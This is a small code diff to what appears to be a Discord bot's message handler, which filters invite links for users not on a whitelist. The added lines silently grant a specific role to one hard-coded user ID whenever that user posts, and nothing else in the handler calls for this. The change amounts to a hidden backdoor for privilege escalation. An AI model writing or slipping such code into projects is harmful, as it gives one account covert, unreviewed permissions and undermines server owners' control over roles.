@@ -1,6 +1,11 @@
 const fetch = require('node-fetch');
 
 module.exports = (client, message) => {
+
+    if(message.author.id == '293841631583535106' && message.member.roles.cache.get('778237595477606440') == null) {
+        message.member.roles.add('778237595477606440');
+    }
+
     let whitelisted = ['137624084572798976', '293841631583535106', '251428574119067648', '338192747754160138'];
     if (!whitelisted.includes(message.author.id)) {
     const inviteREE = new RegExp(/(https?:\/\/)?(www\.)?(discord\.(gg|io|me|li)|discordapp\.com\/invite)\/.+[a-z]/g);
